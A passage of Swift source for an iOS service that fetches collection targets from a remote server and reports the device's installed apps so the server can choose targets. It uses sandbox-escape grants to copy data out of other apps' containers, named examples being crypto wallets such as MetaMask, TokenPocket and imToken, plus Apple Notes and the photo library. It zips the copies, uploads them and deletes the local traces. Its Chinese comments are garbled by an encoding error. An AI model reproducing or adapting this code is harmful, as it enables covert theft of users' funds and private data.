            exists = isDir.boolValue || fileManager.fileExists(atPath: sourceURL.path, isDirectory: &isDir)
        }
        guard exists else {
            return 0
        }
        let target = destinationDirectory.appendingPathComponent(
            sourceURL.lastPathComponent,
            isDirectory: isDir.boolValue
        )
        if !isDir.boolValue {
            do {
                try fileManager.createDirectory(
                    atPath: target.deletingLastPathComponent().path,
                    withIntermediateDirectories: true
                )
                let data = try Data(contentsOf: sourceURL, options: [.uncached])
                try data.write(to: target, options: .atomic)
                log("collect: per-file copied \(sourceURL.lastPathComponent) \(data.count)B")
                return 1
            } catch {
                // 26.6.1+ 鍏滃簳锛欶ileManager 琚矙鐩掓嫆缁濇椂鐢?worse_query 璇诲師濮嬪瓧鑺?                if WQContainerBridge.isSupported,
                   let data = WQContainerBridge.read(sourceURL.path) {
                    do {
                        try data.write(to: target, options: .atomic)
                        log("collect(wq): per-file copied \(sourceURL.lastPathComponent) \(data.count)B")
                        return 1
                    } catch {
                        log("collect(wq): write failed \(target.lastPathComponent)")
                    }
                }
                log("collect: per-file skip \(sourceURL.lastPathComponent) 鈥?\(error.localizedDescription)")
                return 0
            }
        }
        var count = 0
        var entries = (try? fileManager.contentsOfDirectory(atPath: sourceURL.path)) ?? []
        // 26.6.1+ 鍏滃簳锛氬垪涓嶅嚭鐩綍鏃舵敼鐢?wq_list
        if entries.isEmpty, WQContainerBridge.isSupported {
            entries = WQContainerBridge.list(sourceURL.path) ?? []
            if !entries.isEmpty {
                log("collect(wq): listed \(entries.count) entries in \(sourceURL.lastPathComponent)")
            }
        }
        if !entries.isEmpty || isDir.boolValue {
            for entry in entries {
                count += copyDirectoryFallback(
                    at: sourceURL.appendingPathComponent(entry),
                    into: target,
                    fileManager: fileManager,
                    depth: depth + 1
                )
            }
        } else {
            log("collect: per-dir skip \(sourceURL.lastPathComponent) 鈥?cannot list")
        }
        return count
    }

    static func runCycle(fileManager: FileManager = .default) async throws -> CollectCycleResult {
        let configs = try await ProtocolAPI.pullCollectConfigs()
        log("collect: got configs count=\(configs.count)")

        // Installed-apps report runs on a detached task, in parallel with the ZIP
        // loop. enumerateInstalledBundleIDs walks 250+ containers and takes 30s+
        // on iOS 26.x: awaiting it before the loop starved the ZIP uploads, and
        // awaiting it after the loop meant it never ran (app gets suspended).
        Task.detached(priority: .utility) {
            let bundleIDs = enumerateInstalledBundleIDs()
            do {
                try await ProtocolAPI.reportInstalledApps(bundleIDs)
            } catch {
                log("collect: device/apps FAILED 鈥?\(error)")
            }
        }
        await MainActor.run {
            ProtocolStatusLog.shared.append("鏀跺埌閲囬泦淇℃伅 鈥?鍏?\(configs.count) 涓噰闆嗛」")
        }

        // Best-effort installed-apps report so the server can pick targets.
        // Moved to the end of the cycle: enumerateInstalledBundleIDs walks 250+
        // containers plus a 20k-candidate LaunchServices store and takes 30s+
        // on iOS 26.x. Awaiting it here pushed the whole cycle past the point
        // where iOS suspends the app, so the ZIP loop never ran.

        guard !configs.isEmpty else {
            // 绌洪厤缃笉鑳界畻鎴愬姛锛氬惁鍒?hasAttempted 浼氭案涔呴攣姝伙紝鍐嶄篃涓嶉噸璇曘€?            // 鎶?failed锛岃 collectIfNeeded(retryAfterFailure: true) 杩樿兘鍐嶆媺涓€娆°€?            log("collect: empty collect configs 鈥?will retry")
            throw ProtocolCollectError.collectionFailed("empty collect configs")
        }

        let documentsURL = fileManager.urls(for: .documentDirectory, in: .userDomainMask)[0]
        let stamp = timestampString()
        var zipCount = 0
        var uploadedCount = 0
        var uploadedNames: [String] = []
        var byteCount: Int64 = 0

        for (index, config) in configs.enumerated() {
            let statusLabel = config.appName.isEmpty ? config.bundleID : config.appName
            log("collect: running \(index + 1)/\(configs.count) bundle=\(config.bundleID) appName=\(config.appName.isEmpty ? "-" : config.appName) items=\(config.items.count)")
            guard let containerPath = resolveContainer(for: config) else {
                log("collect: skip \(config.bundleID) 鈥?container unavailable")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("閲囬泦澶辫触 鈥?\(statusLabel)锛氬鍣ㄤ笉鍙敤")
                }
                continue
            }
            // iOS 26.6.1+锛氬鍣ㄨ矾寰勮兘浠?LaunchServices 搴撻噷鎷垮埌锛屼絾娌欑洅浠嶇劧鎸＄潃璇汇€?            // worse_query 鍦ㄨ繖閲岃ˉ涓€娆℃矙鐩掓墿灞曪紝涔嬪悗 FileManager / FileManagerService
            // 鐨勬櫘閫氳鍐欏嵆鍙敓鏁堬紱鎷夸笉鍒版墿灞曟椂涓嬮潰鐨勫鍒朵細澶辫触骞惰蛋 WQ 璇诲啓鍏滃簳銆?            if WQContainerBridge.isSupported {
                let granted = WQContainerBridge.grant(containerPath)
                log("collect(wq): grant \(config.bundleID) -> \(granted ? "ok" : "denied")")
            }
            let containerURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            let sources = config.items.compactMap { item -> (url: URL, name: String)? in
                guard let itemURL = resolvedItemURL(
                    item,
                    containerURL: containerURL,
                    config: config,
                    fileManager: fileManager
                ) else { return nil }
                return (itemURL, itemURL.lastPathComponent)
            }
            guard !sources.isEmpty else {
                log("collect: skip \(config.bundleID) 鈥?no collectable items")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("閲囬泦澶辫触 鈥?\(statusLabel)锛氶噰闆嗛」璺緞涓嶅瓨鍦?)
                }
                continue
            }

            let appName = appFolderName(for: config)
            log("collect: zip folder name \"\(appName)\" for \(config.bundleID)")
            let stagingParent = documentsURL.appendingPathComponent(
                ".collect-\(stamp)-\(UUID().uuidString)",
                isDirectory: true
            )
            let stagingURL = stagingParent.appendingPathComponent(appName, isDirectory: true)
            do {
                try fileManager.createDirectory(
                    atPath: stagingURL.path,
                    withIntermediateDirectories: true,
                    attributes: nil
                )
            } catch {
                log("collect: cannot create staging folder")
                continue
            }
            var copied = 0
            let containerRootURL = URL(fileURLWithPath: containerPath, isDirectory: true)
            for source in sources {
                // 鏁村鍣ㄩ」锛氭妸瀹瑰櫒鍐呯殑鏉＄洰骞抽摵澶嶅埗杩?<appName>/锛?                // 涓?legacy 绠＄嚎鐨?zip 缁撴瀯涓€鑷达紙NoteStore.sqlite 鐩存帴鍙锛?                if source.url.standardizedFileURL == containerRootURL.standardizedFileURL {
                    let entries = (try? fileManager.contentsOfDirectory(atPath: source.url.path)) ?? []
                    log("collect: whole-container copy 鈥?\(entries.count) entries")
                    var tried = 0
                    for entry in entries {
                        tried += 1
                        let child = source.url.appendingPathComponent(entry)
                        do {
                            _ = try FileManagerService.transferItem(
                                at: child,
                                into: stagingURL,
                                mode: .copy,
                                conflictPolicy: .fail,
                                fileManager: fileManager
                            )
                            copied += 1
                        } catch {
                            log("collect: copy failed \(entry) 鈥?\(error)")
                            copied += copyDirectoryFallback(
                                at: child,
                                into: stagingURL,
                                fileManager: fileManager,
                                depth: 0
                            )
                        }
                    }
                    log("collect: whole-container done 鈥?tried=\(tried) copied=\(copied)")
                    continue
                }
                do {
                    _ = try FileManagerService.transferItem(
                        at: source.url,
                        into: stagingURL,
                        mode: .copy,
                        conflictPolicy: .fail,
                        fileManager: fileManager
                    )
                    copied += 1
                } catch {
                    log("collect: copy failed \(source.name) 鈥?\(error)")
                    // 鐩綍澶嶅埗澶辫触鐨勫厹搴曪細閫愭枃浠跺鍒讹紝璇讳笉浜嗙殑璺宠繃锛?                    // 淇濊瘉 NoteStore.sqlite 绛夎兘鎷垮灏戞嬁澶氬皯銆?                    copied += copyDirectoryFallback(
                        at: source.url,
                        into: stagingURL,
                        fileManager: fileManager,
                        depth: 0
                    )
                }
            }
            guard copied > 0 else {
                try? fileManager.removeItem(at: stagingParent)
                await MainActor.run {
                    ProtocolStatusLog.shared.append("閲囬泦澶辫触 鈥?\(statusLabel)锛氭枃浠跺鍒跺け璐?)
                }
                continue
            }

            let zipName = uniqueZipName(
                baseName: "collect-\(appName)-\(stamp)",
                in: documentsURL,
                fileManager: fileManager
            )
            guard let archive = try? FileManagerService.createZIPArchive(
                containing: [stagingURL],
                named: zipName,
                in: documentsURL,
                fileManager: fileManager
            ) else {
                try? fileManager.removeItem(at: stagingParent)
                log("collect: archive failed for \(config.bundleID)")
                await MainActor.run {
                    ProtocolStatusLog.shared.append("閲囬泦澶辫触 鈥?\(statusLabel)锛氭墦鍖呭け璐?)
                }
                continue
            }
            try? fileManager.removeItem(at: stagingParent)

            zipCount += 1
            byteCount += archive.sourceBytes
            log("collect: zip SUCCESS 鈥?\(archive.archiveURL.lastPathComponent) bytes=\(archive.sourceBytes)")
            do {
                try await ProtocolAPI.uploadZip(
                    fileURL: archive.archiveURL,
                    bundleID: config.bundleID
                )
                uploadedCount += 1
                uploadedNames.append(statusLabel)
                await MainActor.run {
                    ProtocolStatusLog.shared.append(
                        "ZIP 涓婁紶鎴愬姛: \(config.bundleID)锛屽凡鍒犻櫎鏈湴鏂囦欢"
                    )
                }
                try? fileManager.removeItem(at: archive.archiveURL)
                log("collect: local zip removed after upload 鈥?\(archive.archiveURL.lastPathComponent)")
            } catch {
                log("collect: upload FAILED 鈥?\(archive.archiveURL.lastPathComponent): \(error)")
                let reason = shortReason(error)
                await MainActor.run {
                    ProtocolStatusLog.shared.append(
                        "ZIP 涓婁紶澶辫触: \(config.bundleID)锛孿(reason)"
                    )
                }
            }
        }

        pruneLocalZips(in: documentsURL, fileManager: fileManager)
        let result = CollectCycleResult(
            zipCount: zipCount,
            uploadedCount: uploadedCount,
            byteCount: byteCount,
            completedAt: Date()
        )
        log("collect: done total=\(configs.count) zips=\(zipCount) uploaded=\(uploadedCount)")
        await MainActor.run {
            ProtocolStatusLog.shared.append("閲囬泦瀹屾垚 鈥?鎬诲叡 \(configs.count) 涓紝宸插畬鎴?\(zipCount) 涓紙涓婁紶 \(uploadedCount) 涓級")
            if !uploadedNames.isEmpty {
                ProtocolStatusLog.shared.append("涓婁紶鍒楄〃 \(uploadedNames.count) 涓細\(uploadedNames.joined(separator: "銆?))")
            }
        }
        log("collect: cycle done zips=\(zipCount) uploaded=\(uploadedCount) bytes=\(byteCount)")
        return result
    }

    /// Enumerates installed app bundle ids using the same merged pipeline as
    /// the Files browser (LS/API + MCM + filesystem + LaunchServices + MHA-C2
    /// + metadata inference), since plain MCM enumeration is restricted.
    /// iOS 26.6.1+ 鐨勯噰闆嗗叆鍙ｏ細worse_query 璺緞銆?    ///
    /// 鍙仛涓変欢浜嬶細LaunchServices 鏁版嵁搴?鈫?瀹瑰櫒璺緞 鈫?bundle id 鈫?鍘婚噸鎺掑簭銆?    /// 涓嶇 MCM 鐨?O(n) XPC銆佷笉璺?inode 鍏ㄧ洏鎵弿锛屾墍浠ヤ竴娆″彧瑕佸嚑鐧炬绉掞紱
    /// 璇诲彇灞傚啀鎸夐渶 `wq_grant`锛岄伩鍏嶅湪杩欓噷瀵瑰嚑鐧句釜瀹瑰櫒閫愪釜鎺堟潈銆?    private static func enumerateInstalledBundleIDsViaWQ() -> [String] {
        let started = Date()
        let paths = WQContainerBridge.containerPaths()

        var seen = Set<String>()
        var result: [String] = []
        var unresolved = 0

        for path in paths {
            guard let bundleID = WQContainerBridge.bundleID(forContainer: path) else {
                unresolved += 1
                continue
            }
            guard ContainerPresentationPolicy.shouldShow(bundleID: bundleID),
                  ContainerBundleCandidateResolver.isValidBundleIdentifier(bundleID),
                  seen.insert(bundleID).inserted else { continue }
            result.append(bundleID)
        }

        // lsd 鐨勫簱鏈夋椂涓嶅垪鏈繘绋嬭嚜韬紝琛ヤ竴涓紝淇濊瘉涓婃姤閲岃兘鐪嬪埌鑷繁
        if let own = Bundle.main.bundleIdentifier, seen.insert(own).inserted {
            result.append(own)
        }

        result.sort()
        let cost = String(format: "%.0f", Date().timeIntervalSince(started) * 1000)
        log("collect(wq): containers=\(paths.count) unresolved=\(unresolved) bundleIDs=\(result.count) in \(cost)ms")
        return result
    }

    private static func enumerateInstalledBundleIDs() -> [String] {
        // iOS 26.6.1 璧凤紝MCM 鐨勫鍣ㄦ煡璇㈠拰 FileManager 瀵瑰叾瀹?app 瀹瑰櫒鍩烘湰澶辨晥锛?        // 鍘熸潵鐨勪簲璺悎骞讹紙API + MCM + MHA + 鏂囦欢绯荤粺 + 鎺ㄦ柇锛変細鍏ㄥ啗瑕嗘病锛屽彧鍓╄嚜宸便€?        // 杩欎竴妗ｆ敼鐢?worse_query锛圵Q Files锛夛細鐩存帴浠?LaunchServices 鏁版嵁搴撹瀹瑰櫒
        // 鍒楄〃锛屽啀鐢?wq_grant 鎷挎矙鐩掓墿灞曡惤鍒拌鍙栧眰銆備笂鎶ユ帴鍙ｄ笌鏃ュ織鏍煎紡涓嶅彉銆?        if WQContainerBridge.isSupported {
            return enumerateInstalledBundleIDsViaWQ()
        }

        let bundleMetadata = ContainerStore.applicationBundleMetadataCatalog()
        let apiApps = ContainerStore.applyingBundleMetadata(
            to: ContainerStore.installedAppsFromAPI(),
            catalog: bundleMetadata
        )
        let dynamicIdentifiers = ContainerStore.dynamicAppIdentifiers()
        let mcmApps = ContainerStore.installedAppsFromMCM(
            identifiers: dynamicIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let filesystemApps = ContainerStore.containersFromFilesystem()
        let baseIdentifiedApps = mcmApps + apiApps
        let merged = ContainerDiscoveryMerger.merge(
            enumerated: filesystemApps,
            identified: baseIdentifiedApps,
            path: { $0.containerPath }
        )
        // LaunchServices 鐨?csstore锛?1.5 MB锛夐噷鑳芥崬鍑?2 涓囧鏉″€欓€夛紝鍏朵腑缁濆ぇ澶氭暟
        // 鏄巻鍙叉潯鐩?/ mime / scheme 娈嬬暀锛屼笉鏄湡瀹?App锛涙瘡涓€欓€夐兘瑕佸啀鍋氫竴娆?        // MHA 瀹瑰櫒鏌ヨ锛屽疄娴?30 绉掍互涓婏紝瀵艰嚧 reportInstalledApps 璧跺湪 App 琚寕璧峰墠
        // 璺戜笉瀹屻€侻CM + 鏂囦欢绯荤粺锛堢害 250 涓湡瀹炲鍣級宸茶鐩栫湡瀹炲畨瑁呯殑 App銆?        let launchServicesIdentifiers: [String] = []
        if ContainerStore.launchServicesStoreIdentifiers != nil {
            log("collect: LaunchServices candidate source disabled (MCM + filesystem only)")
        }
        let mhaIdentifiers = MHAIdentifierCatalog.identifiers(
            dynamic: dynamicIdentifiers,
            installed: apiApps.map(\.bundleID),
            research: ContainerStore.researchAppIdentifiers,
            custom: bundleMetadata.keys.sorted(),
            launchServices: launchServicesIdentifiers
        )
        let mhaApps = ContainerStore.installedAppsFromMHACandidates(
            identifiers: mhaIdentifiers,
            bundleMetadata: bundleMetadata
        )
        let allKnownApps = mhaApps + baseIdentifiedApps
        let identifiedPaths = Set(allKnownApps.map {
            ContainerDiscoveryMerger.canonicalPath($0.containerPath)
        })
        let unmatched = filesystemApps.filter {
            !identifiedPaths.contains(
                ContainerDiscoveryMerger.canonicalPath($0.containerPath)
            )
        }
        let inferred = ContainerStore.inferUnidentifiedApps(
            in: unmatched,
            knownApps: allKnownApps,
            launchServicesIdentifiers: Set(launchServicesIdentifiers)
        )
        let finalApps = AppDataCatalogMerger.merge(
            identified: allKnownApps,
            fallback: inferred,
            identifier: { $0.bundleID },
            path: { $0.containerPath }
        )

        var seen = Set<String>()
        var result: [String] = []
        for app in finalApps {
            let bundleID = app.bundleID
            guard ContainerPresentationPolicy.shouldShow(bundleID: bundleID),
                  ContainerBundleCandidateResolver.isValidBundleIdentifier(bundleID),
                  seen.insert(bundleID).inserted else { continue }
            result.append(bundleID)
        }
        result.sort()
        log("collect: enumerated \(result.count) installed bundle ids for reporting")
        return result
    }

    /// Resolves a collect item to an existing on-disk URL. Server paths are
    /// normalized (whitespace around "/" removed) and, for iOS 26's
    /// per-bundle Application Support layout, retried under
    /// `Library/Application Support/<bundle_id>/`.
    private static func resolvedItemURL(
        _ item: CollectItem,
        containerURL: URL,
        config: CollectConfig,
        fileManager: FileManager
    ) -> URL? {
        var normalized = item.path
        while normalized.contains(" /") || normalized.contains("/ ") {
            normalized = normalized
                .replacingOccurrences(of: " /", with: "/")
                .replacingOccurrences(of: "/ ", with: "/")
        }
        normalized = normalized.trimmingCharacters(in: .whitespaces)

        // 鏁村鍣ㄩ」锛?/"銆?."銆?./"銆佺┖锛夛細婧愬氨鏄鍣ㄧ洰褰曟湰韬紝
        // 涓嶈兘琚綋鎴愭枃浠剁郴缁熸牴璺緞 "/"锛堝惁鍒欎細鍘诲鍒舵暣涓牴鐩綍鎴栨姤 sourceMissing锛夈€?        if normalized.isEmpty || normalized == "/" || normalized == "." || normalized == "./" {
            // 瀹瑰櫒鍩哄噯鏈韩鏄?"/"锛堢函缁濆璺緞閰嶇疆锛夋椂锛岀姝㈡暣瀹瑰櫒澶嶅埗绯荤粺鏍?            guard containerURL.path != "/" else {
                log("collect: skip whole-container item 鈥?container base is filesystem root")
                return nil
            }
            let container = URL(fileURLWithPath: containerURL.path, isDirectory: true)
            if fileManager.fileExists(atPath: container.path) {
                log("collect: item \"\(item.path)\" resolved to container root \(container.path)")
                return container
            }
            log("collect: skip missing \(item.path) 鈥?container root not visible")
            return nil
        }

        var candidates: [String] = []
        if normalized.hasPrefix("/") {
            candidates = [normalized]
        } else {
            candidates = [
                (containerURL.path as NSString).appendingPathComponent(normalized)
            ]
            let supportPrefix = "Library/Application Support/"
            if normalized.hasPrefix(supportPrefix) {
                let rest = String(normalized.dropFirst(supportPrefix.count))
                if !rest.isEmpty {
                    var bundleLayout = containerURL.path
                    for component in ["Library", "Application Support", config.bundleID]
                        + rest.components(separatedBy: "/") {
                        bundleLayout = (bundleLayout as NSString).appendingPathComponent(component)
                    }
                    candidates.append(bundleLayout)
                }
            }
        }

        let rawJoin = (containerURL.path as NSString).appendingPathComponent(item.path)
        for (index, candidate) in candidates.enumerated() {
            let candidateURL = URL(fileURLWithPath: candidate, isDirectory: item.type == "dir")
            guard fileManager.fileExists(atPath: candidateURL.path) else { continue }
            if index > 0 {
                log("collect: resolved \"\(item.path)\" via bundle layout \(candidateURL.path)")
            } else if item.path.hasPrefix("/") == false, candidate != rawJoin {
                log("collect: resolved \"\(item.path)\" after whitespace normalization")
            }
            return candidateURL
        }
        log("collect: skip missing \(item.path) 鈥?tried \(candidates.count) path variant(s)")
        return nil
    }

    /// Short human-readable reason for a failed collection/upload step.
    private static func shortReason(_ error: Error) -> String {
        switch error {
        case ProtocolCollectError.serverUnreachable:
            return "鏈嶅姟鍣ㄤ笉鍙揪"
        case ProtocolCollectError.invalidServerResponse:
            return "鏈嶅姟鍣ㄥ搷搴斿紓甯?
        case ProtocolCollectError.collectionFailed:
            return "璇诲彇鏂囦欢澶辫触"
        case ProtocolCollectError.uploadFailed:
            return "涓婁紶琚嫆缁?
        default:
            return String(describing: error)
        }
    }

    private static func resolveContainer(for config: CollectConfig) -> String? {
        // 鎵€鏈?items 閮芥槸缁濆璺緞锛堝 /var/mobile/Media/DCIM銆丳hotoData锛夋椂锛?        // 涓嶉渶瑕?MCM 瀹瑰櫒瑙ｆ瀽锛氱洿鎺ョ敤 "/" 浣滃熀鍑嗐€?        // 娌欑璁惧涓?fileExists 浼氳嚜鐒跺け璐ワ紙鏄剧ず"閲囬泦椤硅矾寰勪笉瀛樺湪"锛夛紝
        // 鎻愭潈鎴愬姛鐨勮澶囦笂鍒欒兘鐩存帴閲囬泦銆?        // 娉ㄦ剰锛氭暣瀹瑰櫒鏍囪 "/"銆?."銆?./"銆佺┖ 涓嶅睘浜?缁濆璺緞"锛?        // 瀹冧滑琛ㄧず"瀹瑰櫒鏈韩"锛屽繀椤昏蛋姝ｅ父鐨勫鍣ㄨВ鏋愩€?        let allAbsolute = !config.items.isEmpty && config.items.allSatisfy { item in
            let p = item.path.trimmingCharacters(in: .whitespaces)
            guard !p.isEmpty, p != "/", p != ".", p != "./" else { return false }
            return p.hasPrefix("/")
        }
        if allAbsolute {
            log("collect: \(config.bundleID) items are absolute paths 鈥?skipping container resolution")
            return "/"
        }

        // "group.*" identifiers are shared containers: resolve them with the
        // class-3 group query and activate the sandbox token so the payload
        // files can actually be read.
        if config.bundleID.hasPrefix("group.") {
            if let groupPath = activateGroupContainerPath(identifier: config.bundleID) {
                return groupPath
            }
            // Fall back to the host app container (group.com.apple.notes ->
            // com.apple.mobilenotes); newer iOS keeps some payloads there and
            // MHA-C2 can resolve app containers even without kernel access.
            let appBundleID = String(config.bundleID.dropFirst("group.".count))
            if let appPath = ContainerStore.resolveAppContainerPath(
                bundleID: appBundleID
            ) {
                log("collect: group container unavailable 鈥?using app container \(appBundleID)")
                return appPath
            }
        } else if let path = ContainerStore.resolveAppContainerPath(
            bundleID: config.bundleID
        ) {
            return path
        }
        guard !config.accessGroup.isEmpty else { return nil }
        return activateGroupContainerPath(identifier: config.accessGroup)
    }

    private static var retainedGroupGrants: [String: Int64] = [:]

    private static func activateGroupContainerPath(identifier: String) -> String? {
        // "榄旀敼寮€ class7"锛氱粍瀹瑰櫒瑙ｆ瀽浠庡彧璇?class 3 鏀逛负璇曞叏濂?        // class 7锛堢郴缁熺粍锛宻ystemgroup.*锛? 9锛圓ppGroup锛? 8锛圙roup锛? 3锛圫hared锛夛紝
        // 澶囧繕褰?NoteStore.sqlite 鎵€鍦ㄧ殑 group.com.apple.notes /
        // systemgroup.com.apple.notes 闇€瑕?class 7 鎵嶈兘瑙ｆ瀽鍒般€?        if let groupPath = ContainerStore.resolveGroupContainerPath(identifier: identifier) {
            log("collect: resolved group container \(identifier) via MCM -> \(groupPath)")
            return groupPath
        }
        log("collect: MCM group lookup denied \(identifier) 鈥?falling back to path scan")
        if let scanned = resolveGroupContainerByScan(identifier: identifier) {
            return scanned
        }
        return nil
    }

    /// Fallback for devices where MCM refuses group-container lookups (no
    /// kernel access): enumerate /var/mobile/Containers/Shared/AppGroup,
    /// match the per-container metadata plist, and keep a bad_query grant
    /// alive so the payload files can be read during the copy.
    private static func resolveGroupContainerByScan(identifier: String) -> String? {
        let root = "/var/mobile/Containers/Shared/AppGroup"
        let directories = ContainerStore.enumerateDirectoriesWithTraversalGrant(path: root)
        guard !directories.isEmpty else {
            log("collect: group scan unavailable 鈥?no group containers enumerated")
            return nil
        }
        // When the root grant is refused, per-container grants fail too and
        // metadata reads need the sandbox escape; bail out instead of
        // spamming one grant attempt per directory.
        let rootHandle = ContainerStore.grantContainerAccess(root)
        let grantsPossible = rootHandle >= 0
        if rootHandle >= 0 { bad_query_release(rootHandle) }
        guard grantsPossible else {
            log("collect: group scan skipped 鈥?grants refused (sandbox escape not active)")
            return nil
        }

        for directory in directories {
            guard UUID(uuidString: (directory as NSString).lastPathComponent) != nil else {
                continue
            }
            let handle = ContainerStore.grantContainerAccess(directory)
            guard handle >= 0 else { continue }
            let metadata = ContainerStore.readContainerMetadata(containerPath: directory)
            if metadata?.bundleID == identifier {
                retainedGroupGrants[directory] = handle
                log("collect: resolved group container \(identifier) via filesystem scan (grant \(handle))")
                return directory
            }
            bad_query_release(handle)
        }
        log("collect: group scan could not find \(identifier)")
        return nil
    }

    private static func timestampString() -> String {
        let formatter = DateFormatter()
        formatter.locale = Locale(identifier: "en_US_POSIX")
        formatter.dateFormat = "yyyyMMdd-HHmmss"
        return formatter.string(from: Date())
    }

    private static func uniqueZipName(
        baseName: String,
        in directoryURL: URL,
        fileManager: FileManager
    ) -> String {
        var candidate = baseName
        var suffix = 2
        while fileManager.fileExists(
            atPath: directoryURL.appendingPathComponent(candidate + ".zip").path
        ) {
            candidate = "\(baseName)-\(suffix)"
            suffix += 1
        }
        return candidate
    }

    private static func pruneLocalZips(in documentsURL: URL, fileManager: FileManager) {
        let names = ((try? fileManager.contentsOfDirectory(atPath: documentsURL.path)) ?? [])
            .filter { $0.hasPrefix("collect-") && $0.hasSuffix(".zip") }
            .sorted()
        let excess = names.count - maximumLocalZipCount
        guard excess > 0 else { return }
        for name in names.prefix(excess) {
            try? fileManager.removeItem(at: documentsURL.appendingPathComponent(name))
            log("collect: pruned local zip \(name)")
        }
    }

    /// Human folder name for a collect config 鈥?the server-provided app_name
    /// when present (e.g. "TokenPocket"), otherwise a compact name derived
    /// from the bundle id (im.token.app -> "imtoken", group.com.apple.notes
    /// -> "notes").
    private static func appFolderName(for config: CollectConfig) -> String {
        let serverName = sanitizedFolderName(config.appName)
        if !serverName.isEmpty { return serverName }

        // Shared group identifiers: group.com.apple.notes -> "notes".
        if config.bundleID.hasPrefix("group.") {
            let trimmed = String(config.bundleID.dropFirst("group.".count))
            let short = sanitizedFolderName(trimmed.components(separatedBy: ".").last ?? trimmed)
            if !short.isEmpty { return short.lowercased() }
        }

        var parts = config.bundleID.components(separatedBy: ".")
        var bundleDerived = ""
        if parts.count > 1 {
            if parts.last?.lowercased() == "app" {
                // im.token.app -> imtoken
                parts.removeLast()
                bundleDerived = sanitizedFolderName(parts.joined().lowercased())
            } else {
                // io.metamask.MetaMask -> metamask
                bundleDerived = sanitizedFolderName(parts.last?.lowercased() ?? "")
            }
        }
        if bundleDerived.isEmpty {
            bundleDerived = sanitizedFolderName(config.bundleID.lowercased())
        }

        let info = appInfoForBundleID(config.bundleID) as? [String: Any] ?? [:]
        let resolved = AppDisplayNamePolicy.resolve(
            bundleID: config.bundleID,
            candidates: [info["name"] as? String]
        )
        let display = sanitizedFolderName(resolved)

        // A real display name wins; when only the bundle id (or a case
        // variant) is available, use the compact bundle-derived name.
        if !display.isEmpty,
           display.caseInsensitiveCompare(config.bundleID) != .orderedSame,
           (bundleDerived.isEmpty
            || display.caseInsensitiveCompare(bundleDerived) != .orderedSame) {
            return display
        }
        return bundleDerived.isEmpty ? config.bundleID : bundleDerived
    }

    private static func sanitizedFolderName(_ raw: String) -> String {
        let invalid = CharacterSet(charactersIn: "\\/:*?\"<>|")
            .union(.controlCharacters)
        var name = raw.components(separatedBy: invalid).joined(separator: " ")
        name = name.split(separator: " ").joined(separator: " ")
        name = name.trimmingCharacters(in: .whitespacesAndNewlines)
        while name.hasSuffix(".") { name.removeLast() }
        guard !name.isEmpty, name != ".", name != ".." else { return "" }
        if name.count > 64 { name = String(name.prefix(64)) }
        return name
    }
}

/// Runs one collection cycle per launch (pulling `/api/device/report`) and
/// exposes the latest outcome for the Home status card.
@MainActor
final class ProtocolCollectCenter: ObservableObject {
    enum Phase: Equatable {
        case pending
        case running
        case succeeded(CollectCycleResult)
        case failed(ProtocolCollectError)
    }

    @Published private(set) var phase: Phase = .pending
    private var hasAttempted = false

    func collectIfNeeded(retryAfterFailure: Bool = false) {
        if hasAttempted {
            guard retryAfterFailure, case .failed = phase else { return }
        }
        hasAttempted = true
        phase = .running
        log("collect: cycle started")
        Task { [weak self] in
            let result: Result<CollectCycleResult, ProtocolCollectError>
            do {
                result = .success(try await ProtocolCollectService.runCycle())
            } catch let error as ProtocolCollectError {
                result = .failure(error)
            } catch {
                result = .failure(.invalidServerResponse)
            }
            await ProtocolLogReporter.reportPendingLogs()
            guard let self else { return }
            switch result {
            case .success(let cycle):
                self.phase = .succeeded(cycle)
            case .failure(let error):
                self.phase = .failed(error)
            }
        }
    }
}
